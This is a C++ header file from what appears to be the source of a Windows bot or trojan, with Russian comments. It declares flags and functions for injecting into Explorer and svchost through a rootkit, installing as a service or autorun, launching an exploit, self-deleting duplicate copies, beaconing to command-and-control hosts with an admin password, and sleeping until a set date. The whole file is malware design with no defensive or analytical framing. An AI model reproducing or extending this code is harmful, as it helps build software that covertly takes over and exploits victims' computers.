#pragma once

#include "config.h"
#include "core\core.h"
#include "core\debug.h"
#include "core\injects.h"
#include "core\rand.h"
#include "AV.h"

//настроечные поля для state
const int NOT_DIRECT_INJECT = 0x0001; //нельзя выполнять прямой инжект в процесс
const int NOT_USED_INJECT = 0x0002; //инжекты выполнять нельзя
const int NOT_INSTALL_SERVICE = 0x0004; //не инсталироваться как сервис
const int NOT_INSTALL_AUTORUN = 0x0008; //не устанавливаться в автозагрузку
const int EXTERN_NAME_MANAGER = 0x0010; //при старте имя менеджера не создавать, а брать из Config::nameManager
const int IS_DLL = 0x0020; //запущены как длл
const int IS_SERVICE = 0x0040; //запущен как сервис
const int RUNNED_DUBLICATION = 0x0080; //запущена 2-я копия
const int SPLOYTY_OFF = 0x0100; //не запускать сплойт
const int RUNNED_UPDATE = 0x0200; //запущен после команды горячего обновления
const int CHECK_DUPLICATION = 0x0400; //проверка на запуск копии (2-я копия самоудаляется и завершает работу)
const int PLUGINS_SERVER = 0x0800; //плагины брать с сервера (настраивается билдером)
const int NOT_USED_SCVHOST = 0x1000; //в работе не использовать запуск и внедрение в свцхост, вся работа ведется в пределах запущенного процесса
const int NOT_EXIT_PROCESS = 0x2000; //основная часть бота мигрировала в существующий процесс, поэтому при выходе нельзя делать ExitProcess
const int SERVER_NOT_PROCESS = 0x4000; //серверная часть не в отдельном процессе

//тип функции для вызова инжектов через rootkit
typedef void (*typeFuncParamDWORD)( DWORD );

namespace Config
{

extern char PeriodConnect[MaxSizePeriodConnect];
extern char Hosts[MaxSizeHostAdmin];
extern char HostsAZ[MaxSizeHostAdmin];
extern char UserAZ[MaxSizeUserAZ];
extern char Password[MaxSizePasswordAdmin];
extern char VideoServers[MaxSizeIpVideoServer];
extern char FlagsVideoServer[MaxFlagsVideoServer];
extern char MiscState[MaxSizeMiscState];
extern char DateWork[MaxSizeDateWork];

#ifdef IP_SERVER_EXTERNAL_IP
extern char ExternalIP[48];
#endif

extern char UID[32];
extern char XorMask[32];
extern int waitPeriod; //сколько ждать до следующего отстука в миллисекундах

extern char nameManager[32]; //имя управляющего пайп канала, находящегося в проводнике
extern char fileNameBot[MAX_PATH]; //имя автозагрузочного файла бота, заполняется при старте или при инсталяции (при инсталяции нужно обязательно заполнить)
extern char fileNameConfig[MAX_PATH]; //имя файла с конфигом для бота
extern char nameService[64]; //имя сервиса, если запущен как сервис
extern char TempNameFolder[16]; //случайное имя папки во временной папке, куда будут ложиться файлы которые нельзя отослать через пайпы
extern int AV;
extern char exeDonor[MAX_PATH]; //имя ехе в который внедряемся вместо svchost.exe

extern uint state; //различные настройки 

extern char* BotVersion;
const int BotVersionInt = 10207;

//дата просыпания
struct StruSleep
{
	byte day;
	byte month;
	ushort year;
};

bool Init();
StringBuilder& NameBotExe( StringBuilder& name );
StringBuilder& FullNameBotExe( StringBuilder& path );
StringBuilder& NameUserAZ( StringBuilder& userAZ );

bool CreateMutex();
void ReleaseMutex();
//возвращает папку в которой находятся рабочие файлы бота, в path должно быть достаточное количество места
//если указан addFolder, то к пути добавляется указанная папка (если нужно, то и создается).
//cryptAddFolder = true, то addFolder шифруется
bool GetBotFolder( StringBuilder& path, const char* addFolder = 0, bool cryptAddFolder = false );
bool GetDefBotFolder( StringBuilder& path, const char* addFolder = 0, bool cryptAddFolder = false );
//возвращает имя файла в папке бота
bool GetBotFile( StringBuilder& fileName, const char* name );
bool InitFileConfig( bool def );

//сохраняет имя менеджера в специальном файле
bool SaveNameManager();
//загружает имя менеджера из специального файла, после чтения удаляет файл, если указано
bool LoadNameManager( bool del = true );
//возвращает имя файла о пометки режима сна
bool GetSleepingFileName( StringBuilder& fileName );
//возвращает true если бот должен еще спать, false - должен бордствовать
bool IsSleeping();
//удаляет пометку о режиме сна
void DelSleeping();
//дата до которой нельзя стучать
uint GetDateWork();

}

bool InitRootkit();
DWORD WINAPI RootkitEntry( void* );
//функция работы в проводнике
DWORD WINAPI ExplorerEntry( void* );
//запуск из под сервиса
DWORD WINAPI ExplorerEntryFromService( void* );
//ижектимся в проводник и запускаем там указанную функцию
bool RunInExplorer( typeFuncThread func );
//функция вызываемая через rootkit
void RunInExplorer2( SIZE_T param );
//функция работы в проводнике, если runAdminPanel = true, то дополнительно запускается svchost для работы с админкой
void ExplorerLoop( bool runAdminPanel );
//ждет 30с пока запустится проводник
bool WaitRunExplorer();
//стартует бота
bool StartBot();
//перезапускает бота, используется при горячем обновлении, если сразу нет коннекта
bool RestartBot();
//запуск бота, сначала внедряется в проводник, потом запускается svchost.exe
//такой старт нужен, если идет запуск из под системного процесса или системных прав
//если dropper = true, то запуск идет из дроппера, будет самоудаление
bool StartBotApart(bool dropper = false);
//вызывает внутри Rootkit функцию func с параметром param, специально для выполнения инжектов
bool InjectCrossRootkit( typeFuncParamDWORD func, DWORD param );
//указывает на каком процессе не выполнять хук rootkit
void SetInjectPID( DWORD pid );
//инжект в указанный процесс через rootkit
bool InjectToProcessRootkit( DWORD pid, typeFuncThread func );
//запуск svchost через руткит
DWORD JumpInSvchostRootkit( typeFuncThread func );
//инсталяция бота
bool InstallBot( StringBuilder& path );
//инсталяция бота в отдельном потоке
DWORD WINAPI InstallBotThread( void* );
